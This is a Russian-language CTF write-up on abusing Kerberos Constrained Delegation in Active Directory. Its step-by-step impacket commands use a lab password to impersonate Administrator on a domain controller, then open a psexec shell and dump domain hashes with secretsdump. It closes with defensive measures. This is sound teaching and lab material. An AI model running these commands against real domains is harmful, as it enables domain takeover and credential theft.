# KERBEROS CONSTRAINED DELEGATION (KCD) — АТАКА ДЕЛЕГИРОВАНИЯ

## Что это

**Kerberos Constrained Delegation** — это механизм Windows, позволяющий сервису (например, `svc.scanner`) "выдавать себя" за другого пользователя для доступа к **определенным сервисам** на **определенных серверах**.

Вместо полного делегирования (где сервис может делать что угодно), Constrained Delegation ограничивает разрешения: только конкретная служба (например, `cifs`) и только конкретный сервер (например, `DC01`).


## Как это выглядит в BloodHound

- **AllowedToDelegate** — означает, что учетка может делегироваться для указанных сервисов

Например:
- `svc.scanner` имеет `AllowedToDelegate` на `cifs/DC01.ctf.local`


## Почему это опасно

Если атакующий контролирует учетку с правом `AllowedToDelegate`, он может:
1. Подделать билет от имени **любого пользователя** (например, `Administrator`)
2. Получить доступ к указанному сервису (например, SMB) на указанном сервере
3. Получить полный контроль над этим сервером


## Когда атака возможна

| Условие | Объяснение |
|---------|------------|
| Учетка имеет `AllowedToDelegate` на SPN | Найдено в BloodHound |
| Учетка имеет пароль (или NTLM хэш) | Для получения TGT |
| Целевой сервер — Domain Controller | CIFS доступ дает полный контроль |


## Инструменты

- `impacket-getTGT` — получение TGT (Ticket Granting Ticket)
- `impacket-getST` — получение Service Ticket (подделка)
- `impacket-psexec` / `impacket-secretsdump` — использование поддельного билета


## Пошаговая атака

### 1. Получить TGT для учетки с делегированием

getTGT.py DOMAIN/ACCOUNT:'PASSWORD' -dc-ip DC_IP

Пример:
getTGT.py ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.49.187.41

Результат: файл `svc.scanner.ccache`

### 2. Экспортировать билет
export KRB5CCNAME=svc.scanner.ccache

### 3. Подделать билет для целевого пользователя и сервиса
getST.py -spn 'SERVICE/HOST' -impersonate 'TARGET_USER' DOMAIN/ACCOUNT -dc-ip DC_IP

Пример:
getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' ctf.local/svc.scanner -dc-ip 10.49.187.41

Результат: файл `Administrator.ccache`

### 4. Экспортировать поддельный билет
export KRB5CCNAME=Administrator.ccache

### 5. Использовать билет для доступа к цели
psexec.py -k -no-pass DOMAIN/TARGET_USER@TARGET_HOST

Пример:
psexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local

или для дампа хэшей:
secretsdump.py -k -no-pass ctf.local/Administrator@DC01.ctf.local -just-dc


## Флаги объяснение

| Флаг | Значение |
|------|----------|
| `-k` | Использовать Kerberos аутентификацию |
| `-no-pass` | Не запрашивать пароль (используем билет) |
| `-spn` | Service Principal Name — целевая служба и хост |
| `-impersonate` | Кого выдавать себя |


## Что означает `cifs/DC01.ctf.local`

| Часть | Значение |
|-------|----------|
| `cifs` | Служба (SMB — файловые шары, администрирование) |
| `DC01.ctf.local` | Хост (контроллер домена) |

Если есть доступ к `cifs` на DC — можно читать файлы, запускать команды, дампить хэши.


## Защита от атаки

- Использовать **Protected Users** group — запрещает делегирование
- Включить **Sensitive Account** флаг для привилегированных учеток
- Использовать **Resource-based Constrained Delegation** вместо обычной
- Мониторить Event ID 4769 (TGS запросы с delegation)

## Итог

`AllowedToDelegate` в BloodHound = **золотая жила**. Если у учетки есть это право, и ты знаешь ее пароль (или NTLM хэш) — ты можешь стать любым пользователем на сервере, где разрешено делегирование.

В твоем случае `svc.scanner` позволил стать `Administrator` на DC — полный контроль над доменом.